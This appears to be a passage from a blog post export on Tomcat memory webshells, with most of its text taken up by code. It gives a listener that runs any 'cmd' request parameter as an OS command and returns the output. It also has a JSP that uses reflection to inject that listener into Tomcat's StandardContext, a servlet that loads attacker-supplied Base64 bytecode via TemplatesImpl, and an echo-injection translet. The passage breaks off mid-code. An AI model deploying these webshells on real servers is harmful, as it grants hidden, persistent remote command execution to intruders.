import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //listener\n    standardContext.addApplicationEventListener(new Testlistener());\n%>\n```\n\n","slug":"TomcatListener","published":1,"updated":"2024-04-17T08:43:00.811Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7iw000gh7769sksbi80","content":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p> filter  listener </p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p> <code>filter</code>  <code>filter</code>  <code>webshell</code>  <code>listener</code>  <code>listener</code> </p>\n<h3 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h3><p> <code>Listener</code> webshell <code>request</code>  <code>Listener</code></p>\n<p><code>requestInitialized</code> <code>ServletRequestEvent</code> servlet <code>ServletRequestEvent</code>  <code>request</code> </p>\n<p> <code>getServletRequest</code>  <code>request</code> </p>\n<p> <code>ServletRequest</code> </p>\n<p> <code>org.apache.catalina.connector.RequestFacade</code> </p>\n<p> <code>request</code>  <code>Request</code> </p>\n<p> <code>Listener</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.Filter;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p></p>\n<h3 id=\"Listener\"><a href=\"#Listener\" class=\"headerlink\" title=\"Listener\"></a>Listener</h3><p> <code>Listener</code> </p>\n<p></p>\n<p> <code>StandardContext$listenerStart</code> <code>listeners</code> </p>\n<p><code>listeners</code>  <code>String</code>  <code>listener</code> , <code>findApplicationListeners</code> </p>\n<p><code>results</code>  <code>listener</code> </p>\n<p> <code>results</code>  <code>listener</code>  <code>TestListener</code>  <code>eventListeners</code> </p>\n<p> <code>getApplicationEventListeners</code>  <code>applicationEventListenersList</code>  <code>applicationEventListener</code>  <code>eventListeners</code>  <code>setApplicationEventListeners</code> <code>eventListeners</code> <code>ApplicationEventListeners</code> <code>applicationEventListener</code>  <code>set</code>  <code>setApplicationEventListeners</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void setApplicationEventListeners(Object[] listeners) &#123;</span><br><span class=\"line\">        this.applicationEventListenersList.clear();</span><br><span class=\"line\">        if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;</span><br><span class=\"line\">            this.applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> <code>applicationEventListenersList</code> </p>\n<p> <code>instance</code>  <code>lsitener</code>  <code>listener</code> </p>\n<p></p>\n<p> <code>requestInitialized</code>  <code>StandardContext$fireRequestInitEvent</code>  <code>listener</code>  <code>instances</code> <code>instances</code> <code>getApplicationEventListeners</code> </p>\n<p> <code>listener</code>  list</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">listenerList.add(new Testlistener());</span><br><span class=\"line\">standardContext.setApplicationEventListeners(listenerList.toArray());</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JSP\"><a href=\"#JSP\" class=\"headerlink\" title=\"JSP\"></a>JSP</h3><p> <code>JSP</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\">    </span><br><span class=\"line\">    //listener</span><br><span class=\"line\">    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">    listenerList.add(new Testlistener());</span><br><span class=\"line\">    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<p>demo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.ServletException;</span><br><span class=\"line\">import javax.servlet.http.HttpServlet;</span><br><span class=\"line\">import javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\">import javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerShell extends HttpServlet&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        String test=req.getParameter(&quot;test&quot;);</span><br><span class=\"line\">        byte[] bytecode= Base64.getDecoder().decode(test);</span><br><span class=\"line\">        byte[][] bytee= new byte[][]&#123;bytecode&#125;;</span><br><span class=\"line\">        TemplatesImpl templates=new TemplatesImpl();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            setFildValue(templates,&quot;_bytecodes&quot;,bytee);</span><br><span class=\"line\">            setFildValue(templates,&quot;_name&quot;,&quot;Code&quot;);</span><br><span class=\"line\">            setFildValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class=\"line\">            templates.newTransformer();</span><br><span class=\"line\">        &#125; catch (TransformerConfigurationException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        super.doGet(req, resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class=\"line\">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class=\"line\">        field.setAccessible(true);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> <code>TemplatesImpl</code> </p>\n<p>POC <code>lastServicedRequest</code> </p>\n<ul>\n<li> <code>request</code>  <code>response</code> <code>lastServicedRequest</code>  <code>lastServicedResponse</code> </li>\n<li> <code>request</code>  <code>lastServicedRequest</code> listener</li>\n</ul>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Echoinject extends AbstractTranslet &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //WRAP_SAME_OBJECTtrue</span><br><span class=\"line\">            Class dispatcher = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><br><span class=\"line\">            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><br><span class=\"line\">            WRAP_SAME_OBJECT.setAccessible(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            //finalfinal</span><br><span class=\"line\">            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            if (!WRAP_SAME_OBJECT.getBoolean(null)) &#123;</span><br><span class=\"line\">                WRAP_SAME_OBJECT.setBoolean(null, true);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //lastServicedRequest</span><br><span class=\"line\">            Class filterchain = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><br><span class=\"line\">            Field lastServicedRequest = filterchain.getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedRequest.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedRequest.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedRequest.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedRequest.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //lastServicedResponse</span><br><span class=\"line\">            Field lastServicedResponse = filterchain.getDeclaredField(&quot;lastServicedResponse&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedResponse.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            lastServicedResponse.setAccessible(true);</span><br><span class=\"line\">            if (lastServicedResponse.get(null) == null) &#123;</span><br><span class=\"line\">                lastServicedResponse.set(null, new ThreadLocal());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span 